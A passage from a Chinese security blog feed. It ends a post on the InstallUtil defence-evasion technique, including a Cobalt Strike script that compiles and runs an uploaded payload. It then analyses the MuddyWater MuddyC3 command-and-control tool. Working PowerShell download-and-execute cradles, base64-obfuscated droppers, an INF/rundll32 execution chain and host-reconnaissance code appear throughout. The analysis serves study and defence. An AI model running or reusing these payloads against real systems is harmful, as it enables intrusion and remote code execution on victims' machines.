</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">LoadLibrary</span>(<span class="params"> <span class="built_in">string</span> lpFileName </span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="string">&quot;kernel32&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetLastError</span>()</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">struct</span> PROCESSOR_INFO</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> UInt32 dwMax;</span><br><span class="line"><span class="keyword">public</span> UInt32 id0;</span><br><span class="line"><span class="keyword">public</span> UInt32 id1;</span><br><span class="line"><span class="keyword">public</span> UInt32 id2;</span><br><span class="line"><span class="keyword">public</span> UInt32 dwStandard;</span><br><span class="line"><span class="keyword">public</span> UInt32 dwFeature;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if AMD</span></span><br><span class="line"><span class="keyword">public</span> UInt32 dwExt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样CS也是一样的写法和思路</p><p>下面为我已编写好的脚本演示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com//cst1118.gif" alt="cst1118"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># demonsec666</span><br><span class="line">sub t1118 &#123;</span><br><span class="line">bupload($bid, $<span class="number">3</span>[<span class="string">&#x27;payloadfile&#x27;</span>]);</span><br><span class="line">bmv($bid, <span class="string">&quot;t1118.cs&quot;</span>, $<span class="number">3</span>[<span class="string">&#x27;rfile&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已上传文件&quot;</span>); </span><br><span class="line">bexecute($bid, <span class="string">&quot;C:\\Windows\\Microsoft.NET\\Framework\\&quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;dotnet_version&#x27;</span>].<span class="string">&quot;\\csc.exe /out:&quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;rdll&#x27;</span>].<span class="string">&quot; &quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;rfile&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已生成文件&quot;</span>); </span><br><span class="line">bpause($bid, <span class="type">int</span>(<span class="number">3000</span>));</span><br><span class="line">bexecute($bid, <span class="string">&quot;C:\\Windows\\Microsoft.NET\\Framework\\&quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;dotnet_version&#x27;</span>].<span class="string">&quot;\\InstallUtil.exe /U /logfile= /logtoconsole=false &quot;</span>.$<span class="number">3</span>[<span class="string">&#x27;rdll&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已执行文件&quot;</span>); </span><br><span class="line">bpause($bid, <span class="type">int</span>(<span class="number">3000</span>));</span><br><span class="line">brm($bid, $<span class="number">3</span>[<span class="string">&#x27;rfile&#x27;</span>]);</span><br><span class="line">elog(<span class="string">&quot;已删除缓存文件&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">popup beacon_bottom &#123;</span><br><span class="line">menu <span class="string">&quot;&amp;ATT&amp;CK&quot;</span> &#123;</span><br><span class="line">item <span class="string">&quot;T1118&quot;</span>&#123;</span><br><span class="line">$bid = $<span class="number">1</span>;</span><br><span class="line">$dialog = dialog(<span class="string">&quot;T1118&quot;</span>, %(rfile =&gt; <span class="string">&quot;C:\\Windows\\Temp\\t1118.tmp&quot;</span> ,rdll =&gt; <span class="string">&#x27;C:\\windows\\temp\\t1118.dll&#x27;</span>,dotnet_version =&gt; <span class="string">&#x27;v4.0.30319&#x27;</span>), &amp;t1118);</span><br><span class="line">drow_file($dialog, <span class="string">&quot;payloadfile&quot;</span>, <span class="string">&quot;Payload:&quot;</span>);</span><br><span class="line">drow_text($dialog, <span class="string">&quot;rfile&quot;</span>,  <span class="string">&quot;上传远程路径:&quot;</span>);</span><br><span class="line">drow_text($dialog, <span class="string">&quot;rdll&quot;</span>,  <span class="string">&quot;生成dll路径:&quot;</span>);</span><br><span class="line">drow_text($dialog, <span class="string">&quot;dotnet_version&quot;</span>,  <span class="string">&quot;dotnet 版本:&quot;</span>);</span><br><span class="line">dbutton_action($dialog, <span class="string">&quot;Go&quot;</span>);</span><br><span class="line">dialog_show($dialog);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>参考链接：</strong></p><p> <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md#atomic-test-7---installutil-helptext-method-call">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md#atomic-test-7---installutil-helptext-method-call</a> </p><p> <a href="https://attack.mitre.org/techniques/T1218/004/">https://attack.mitre.org/techniques/T1218/004/</a> </p><p><a href="https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb">https://github.com/praetorian-code/purple-team-attack-automation/blob/master/modules/post/windows/purple/t1118.rb</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APT污水攻击MuddyC3 1.1.1版本浅析</title>
      <link href="/APT%E6%B1%A1%E6%B0%B4%E6%94%BB%E5%87%BBMuddyC3%201.1.1%E7%89%88%E6%9C%AC%E6%B5%85%E6%9E%90.html"/>
      <url>/APT%E6%B1%A1%E6%B0%B4%E6%94%BB%E5%87%BBMuddyC3%201.1.1%E7%89%88%E6%9C%AC%E6%B5%85%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1.png" alt="enter description here"></p><span id="more"></span><h2 id="APT污水攻击MuddyC3-1-1-1版本浅析"><a href="#APT污水攻击MuddyC3-1-1-1版本浅析" class="headerlink" title="APT污水攻击MuddyC3 1.1.1版本浅析"></a>APT污水攻击MuddyC3 1.1.1版本浅析</h2><p><strong>本文作者竭力保证文章内容可靠，但对于任何错误、疏漏或不准确的内容，作者不负任何责任。文章部分内容来源于网络是出于传递更多信息的目的，对此不负任何法律责任。本文仅用于技术分享与讨论，严禁用于其他用途。</strong></p><h2 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h2><p><strong>MuddyWater是一个伊朗威胁组织，主要针对中东、欧洲和北美国家。该组织针对的目标主要是电信，政府（IT服务）和石油部门。众多安全研究机构针对muddywater的样本进行了深入的研究。2019年6月24日，名为0xffff0800的用户在twitter上发表推文表示，其开源了污水攻击的python版代码。本文就该代码，一窥muddywater的攻击过程</strong></p><p><strong>整体结构</strong></p><ol><li>代理重新连接</li><li>加载模块</li><li>发送命令和接收结果</li><li>创建Powershell负载</li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/24.png" alt="enter description here"></p><p>​       整个通信过程有三个要素，即攻击端、C2网站和目的主机。其中C2网站指的是被攻击者拿到控制权限的web网站。C2网站可能不止一个。攻击过程中，攻击者将攻击指令以powershell代码的形式注入C2网站，被感染的目的主机主动向C2网站发送http请求，得到攻击命令，调用powershell接口执行命令。</p><p>​     并同时在今年2020年1月13 日Ahmed Khlief 作者在博客上发布了1.1.1的版，弥补了之前未公开的payload。本文着重就以payload为重点讲解。</p><h2 id="功能和代码分析"><a href="#功能和代码分析" class="headerlink" title="功能和代码分析"></a>功能和代码分析</h2><p>版本1.0.1和1.1.1版本从代码结构上只有少量不同，下图为入口界面截图</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/5.png" alt="enter description here"></p><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a><strong>功能分析</strong></h3><h3 id="1-1服务端分析"><a href="#1-1服务端分析" class="headerlink" title="1.1服务端分析"></a>1.1服务端分析</h3><p>运行muddyc3.py文件</p><p>需要输入ip、端口和是否需要代理输入完成后进入命令界面</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4.png" alt="enter description here"></p><h4 id="1-1-1-list命令"><a href="#1-1-1-list命令" class="headerlink" title="1.1.1 list命令"></a>1.1.1 list命令</h4><p>用来列举agent信息，列举结果示意如下：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6.png" alt="enter description here"></p><h4 id="1-1-2-show命令"><a href="#1-1-2-show命令" class="headerlink" title="1.1.2 show命令"></a>1.1.2 show命令</h4><p>目前尚未开发。</p><h4 id="1-1-3-use命令"><a href="#1-1-3-use命令" class="headerlink" title="1.1.3 use命令"></a>1.1.3 use命令</h4><p>use命令后需要agent id作为参数，命令格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use id</span><br></pre></td></tr></table></figure><p>命令结果是进入id下的命令界面：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9.png" alt="enter description here"></p><h4 id="1-1-4-payload命令"><a href="#1-1-4-payload命令" class="headerlink" title="1.1.4 payload命令"></a>1.1.4 payload命令</h4><p>payload命令列举出目前服务端程序中已有的powershell注入命令。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/10.png" alt="enter description here"></p><p>​       </p><p>​    通过分析core文件夹下webserver.py文件中下图为payload 代码。通过简单的IP和端口替换，并进行base64等加密手段而成的多种payload</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/11.png" alt="enter description here"></p><h5 id="首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的"><a href="#首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的" class="headerlink" title="首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的"></a>首先我们来看下比较明显的三组不同类型的payload，最终目的皆为到达绕过杀软的目的</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">---</span>+Powershell JOB + File Payload+<span class="literal">---</span></span><br><span class="line"><span class="built_in">iex</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamYnKTtJRVgoJHMp&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="literal">---</span>+Powershell JOB + File +SCT Payload+<span class="literal">---</span></span><br><span class="line"><span class="built_in">iex</span>([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamZzJyk7SUVYKCRzKQ==&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.90.135/get&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><h5 id="1-未加密部分"><a href="#1-未加密部分" class="headerlink" title="1.未加密部分"></a>1.未加密部分</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.90.135/get&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>其中核心的payload为 get部分，[<code>http://192.168.1.19:4444/get</code>]<strong>由该页面在powershell上下载为字符串执行在客户端</strong>。需要注意的是这段url并未进行base64加密。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/12.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/13.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/14.png" alt="enter description here"></p><h5 id="2-两个base64加密部分"><a href="#2-两个base64加密部分" class="headerlink" title="2.两个base64加密部分"></a>2.两个base64加密部分</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---+Powershell JOB + File Payload+---</span><br><span class="line">iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamYnKTtJRVgoJHMp&#x27;)))</span><br><span class="line"></span><br><span class="line">---+Powershell JOB + File +SCT Payload+---</span><br><span class="line">iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(&#x27;JFY9bmV3LW9iamVjdCBuZXQud2ViY2xpZW50OyRWLnByb3h5PVtOZXQuV2ViUmVxdWVzdF06OkdldFN5c3RlbVdlYlByb3h5KCk7JFYuUHJveHkuQ3JlZGVudGlhbHM9W05ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JFM9JFYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTIuMTY4LjEuMTk6NDQ0NC9oamZzJyk7SUVYKCRzKQ==&#x27;)))</span><br></pre></td></tr></table></figure><p>由第一个base64解密得出为下图</p><p>依旧是请求<code>http://192.168.90.135:4444/get</code> 链接，下载字符串，并进行执行</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/26.png" alt="enter description here"></p><h5 id="3-俄罗斯套娃"><a href="#3-俄罗斯套娃" class="headerlink" title="3.俄罗斯套娃"></a>3.俄罗斯套娃</h5><p>而第二个base64则为多个base64加密嵌套，像极了俄罗斯套娃 </p><p>得到的链接为<code>http://192.168.90.135:4444/hjfs</code></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/25.png" alt="enter description here"></p><p>那么我们去看看这个hjfs的内容是什么</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/27.png" alt="enter description here"></p><p>经过base64解密得出以下代码，其中得出两个链接分别 为 &#x2F;sct、&#x2F;getc</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$V</span>=<span class="built_in">new-object</span> net.webclient;<span class="variable">$V</span>.proxy=[<span class="type">Net.WebRequest</span>]::GetSystemWebProxy();<span class="variable">$V</span>.Proxy.Credentials=[<span class="type">Net.CredentialCache</span>]::DefaultCredentials;<span class="variable">$S</span>=<span class="variable">$V</span>.DownloadString(<span class="string">&#x27;http://192.168.90.135:4444/getc&#x27;</span>);<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\a.zip <span class="literal">-value</span> <span class="variable">$S</span>;<span class="variable">$S</span>=<span class="variable">$V</span>.DownloadString(<span class="string">&#x27;http://192.168.90.135:4444/sct&#x27;</span>);<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\sct.zip <span class="literal">-value</span> <span class="variable">$S</span>;<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\sct.ps1 <span class="literal">-value</span> ([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;JHM9KGdldC1jb250ZW50IEM6XFxQcm9ncmFtRGF0YVxcYS56aXApOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS00MCk7aWYoKCgkYysxKSUzKSAtZXEgMCl7d2hpbGUoJHYgLW5lIDApeyR2dj0kdiUyNTY7aWYoJHZ2IC1ndCAwKXskZCs9W2NoYXJdW0ludDMyXSR2dn0kdj1bSW50MzJdKCR2LzI1Nil9fSRjKz0xO307W2FycmF5XTo6UmV2ZXJzZSgkZCk7aWV4KFtTdHJpbmddOjpKb2luKCcnLCRkKSk7&#x27;</span>)));<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\sct.ini <span class="literal">-value</span> ([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQoNCltFeGNlbF0NClVuUmVnaXN0ZXJPQ1hzPUV2ZW50TWFuYWdlcg0KDQpbRXZlbnRNYW5hZ2VyXQ0KJTExJVxzY3JvYmouZGxsLE5JLGM6L3Byb2dyYW1kYXRhL3NjdC56aXANCg0KW1N0cmluZ3NdDQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciINClNlcnZpY2VOYW1lPSIgIg0KU2hvcnRTdmNOYW1lPSIgIg==&#x27;</span>)));<span class="built_in">start-process</span> rundll32.exe <span class="literal">-ArgumentList</span> <span class="string">&quot;advpack.dll,LaunchINFSection C:\ProgramData\sct.ini,Excel,1,&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>;<span class="built_in">start-sleep</span> <span class="number">30</span>;<span class="built_in">del</span> c:\programdata\a.zip;<span class="built_in">del</span> c:\programdata\sct.ps1;<span class="built_in">del</span> c:\programdata\sct.zip;<span class="built_in">del</span> c:\programdata\sct.ini;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/28.png" alt="enter description here"></p><p>剩余两个base64部分为以下内容，进行其他的功能传输</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=(<span class="built_in">get-content</span> C:\\ProgramData\\a.zip);<span class="variable">$d</span> = <span class="selector-tag">@</span>();<span class="variable">$v</span> = <span class="number">0</span>;<span class="variable">$c</span> = <span class="number">0</span>;<span class="keyword">while</span>(<span class="variable">$c</span> <span class="operator">-ne</span> <span class="variable">$s</span>.length)&#123;<span class="variable">$v</span>=(<span class="variable">$v</span>*<span class="number">52</span>)+([<span class="built_in">Int</span><span class="type">32</span>][<span class="built_in">char</span>]<span class="variable">$s</span>[<span class="variable">$c</span>]<span class="literal">-40</span>);<span class="keyword">if</span>(((<span class="variable">$c</span>+<span class="number">1</span>)%<span class="number">3</span>) <span class="operator">-eq</span> <span class="number">0</span>)&#123;<span class="keyword">while</span>(<span class="variable">$v</span> <span class="operator">-ne</span> <span class="number">0</span>)&#123;<span class="variable">$vv</span>=<span class="variable">$v</span>%<span class="number">256</span>;<span class="keyword">if</span>(<span class="variable">$vv</span> <span class="operator">-gt</span> <span class="number">0</span>)&#123;<span class="variable">$d</span>+=[<span class="built_in">char</span>][<span class="built_in">Int</span><span class="type">32</span>]<span class="variable">$vv</span>&#125;<span class="variable">$v</span>=[<span class="built_in">Int</span><span class="type">32</span>](<span class="variable">$v</span>/<span class="number">256</span>)&#125;&#125;<span class="variable">$c</span>+=<span class="number">1</span>;&#125;;[<span class="built_in">array</span>]::Reverse(<span class="variable">$d</span>);<span class="built_in">iex</span>([<span class="built_in">String</span>]::Join(<span class="string">&#x27;&#x27;</span>,<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"></span><br><span class="line"><span class="section">[Excel]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=EventManager</span><br><span class="line"></span><br><span class="line"><span class="section">[EventManager]</span></span><br><span class="line">%11%\scrobj.dll,NI,c:/programdata/sct.zip</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">&quot;SOFTWARE\Microsoft\Connection Manager&quot;</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><h3 id="1-2参数分析"><a href="#1-2参数分析" class="headerlink" title="1.2参数分析"></a>1.2参数分析</h3><p>通过分析core文件夹下cmd.py文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7.png" alt="enter description here"></p><p>得出AGENTS字典中每个元素的结构如下：</p><table><thead><tr><th>角标</th><th>参数</th><th>归属</th></tr></thead><tbody><tr><td>*</td><td>id</td><td>key值</td></tr><tr><td>0</td><td>ExternalIP</td><td>data</td></tr><tr><td>1</td><td>id</td><td>data</td></tr><tr><td>2</td><td>status</td><td>data</td></tr><tr><td>3</td><td>os</td><td>data</td></tr><tr><td>4</td><td>InternalIP</td><td>data</td></tr><tr><td>5</td><td>Arch</td><td>data</td></tr><tr><td>6</td><td>ComputerName</td><td>data</td></tr><tr><td>7</td><td>UserName</td><td>data</td></tr></tbody></table><p><strong>AGENT是一个’id:data’形式的字典</strong>，其中data格式如下：</p><table><thead><tr><th>角标</th><th>参数</th></tr></thead><tbody><tr><td>0</td><td>id</td></tr><tr><td>1</td><td>status</td></tr><tr><td>2</td><td>Internal IP</td></tr><tr><td>3</td><td>OS</td></tr><tr><td>4</td><td>Arch</td></tr><tr><td>5</td><td>Computer Name</td></tr><tr><td>6</td><td>User Name</td></tr></tbody></table><p><strong>在core文件夹下webserver.py文件中</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8.png" alt="enter description here"></p><p>分别定义了多种url 接口</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/31.png" alt="enter description here"></p><p>url访问功能分类如下：</p><table><thead><tr><th>编号</th><th>类别</th><th>表示方法</th><th>get&#x2F;post</th><th>功能或结果</th></tr></thead><tbody><tr><td>1</td><td>index</td><td>&#x2F;</td><td>get</td><td>返回‘hello’</td></tr><tr><td>2</td><td>payload</td><td>&#x2F;get</td><td>get</td><td>返回‘config&#x2F;PAYLOAD()’</td></tr><tr><td>3</td><td>payloadc</td><td>&#x2F;getc</td><td>get</td><td>返回‘toB52(config&#x2F;PAYLOAD())’</td></tr><tr><td>4</td><td>payloadjf</td><td>&#x2F;hjf</td><td>get</td><td>返回C:&#x2F;&#x2F;ProgramData下a.zip和b.ps1</td></tr><tr><td>5</td><td>payloadjfs</td><td>&#x2F;hjfs</td><td>get</td><td>返回C:&#x2F;&#x2F;ProgramData下sct.ini</td></tr><tr><td>6</td><td>sct</td><td>&#x2F;sct</td><td>get</td><td>返回ps1文件</td></tr><tr><td>7</td><td>mshta</td><td>&#x2F;hta</td><td>get</td><td>返回ps1文件</td></tr><tr><td>8</td><td>info</td><td>&#x2F;info&#x2F;~</td><td>post</td><td>查询id，若不存在则在AGENTS中添加</td></tr><tr><td>9</td><td>download</td><td>&#x2F;dl&#x2F;~</td><td>post</td><td>从服务端指定路径下载文件</td></tr><tr><td>10</td><td>upload</td><td>&#x2F;up</td><td></td><td>暂不支持该功能</td></tr><tr><td>11</td><td>img</td><td>&#x2F;img&#x2F;~</td><td>post</td><td>得到相关img</td></tr><tr><td>12</td><td>command</td><td>&#x2F;cm&#x2F;~</td><td>get</td><td>得到‘config.COMMAND[id]’中的命令</td></tr><tr><td>13</td><td>result</td><td>&#x2F;re&#x2F;~</td><td>post</td><td>得到指定id主机的data</td></tr><tr><td>14</td><td>modules</td><td>&#x2F;md&#x2F;~</td><td>post</td><td>添加模块</td></tr></tbody></table><h3 id="2-客户端分析"><a href="#2-客户端分析" class="headerlink" title="2.客户端分析"></a>2.客户端分析</h3><p>由1.1.4部分中的payload均为加密部分，而最核心的就是在core中的payload.ps1部分，在1.1.4小节中显示的这些payload全部都是围绕着core中的payload.ps1中从而去演变加密，下面我们从简单而去分析payload.ps1部分</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/15.png" alt="enter description here"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.90.135:4444/get&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>PowerShell的主要作用是从远程位置下载恶意文件到受害者主机中，然后使用诸如<strong>Start-Porcess</strong>、<strong>Invoke-Item</strong>或者<strong>Invoke-Expression</strong>（**-IEX**）之类的命令执行恶意文件，PowerShell也可以将远程文件直接下载到受害者主机内存中，然后从内存中执行。</p><p>实际攻击活动中经常使用到<strong>System.net.Webclient</strong>中的两种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(New-object System.net.webclient).DownlodFile() </span><br><span class="line">(New-object System.net.Webclient).DownloadString()</span><br></pre></td></tr></table></figure><h4 id="2-1-agent-info信息"><a href="#2-1-agent-info信息" class="headerlink" title="2.1 agent info信息"></a>2.1 agent info信息</h4><p>在<code>http://192.168.90.135:4444/get</code>中的部分powershell代码为agent的相关信息显示如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hostname</span> = <span class="variable">$env:COMPUTERNAME</span>;</span><br><span class="line"><span class="variable">$whoami</span> = <span class="variable">$env:USERNAME</span>;</span><br><span class="line"><span class="variable">$arch</span> = (<span class="built_in">Get-WmiObject</span> Win32_OperatingSystem).OSArchitecture</span><br><span class="line"><span class="variable">$os</span> = (<span class="built_in">Get-WmiObject</span> <span class="literal">-class</span> Win32_OperatingSystem).Caption + <span class="string">&quot;(<span class="variable">$arch</span>)&quot;</span>;</span><br><span class="line"><span class="variable">$domain</span> = (<span class="built_in">Get-WmiObject</span> Win32_ComputerSystem).Domain;</span><br><span class="line"><span class="variable">$IP</span>=(<span class="built_in">gwmi</span> <span class="literal">-query</span> <span class="string">&quot;Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True&quot;</span>).IPAddress[<span class="number">0</span>]</span><br><span class="line"><span class="variable">$random</span> = <span class="operator">-join</span> ((<span class="number">65</span>..<span class="number">90</span>) | <span class="built_in">Get-Random</span> <span class="literal">-Count</span> <span class="number">5</span> | % &#123;[<span class="built_in">char</span>]<span class="variable">$_</span>&#125;);</span><br><span class="line"><span class="variable">$agent</span>=<span class="string">&quot;<span class="variable">$random</span>-img.jpeg&quot;</span></span><br><span class="line"><span class="variable">$finaldata</span>=<span class="string">&quot;<span class="variable">$os</span>**<span class="variable">$IP</span>**<span class="variable">$arch</span>**<span class="variable">$hostname</span>**<span class="variable">$domain</span>**<span class="variable">$whoami</span>&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/16.png" alt="enter description here"></p><h4 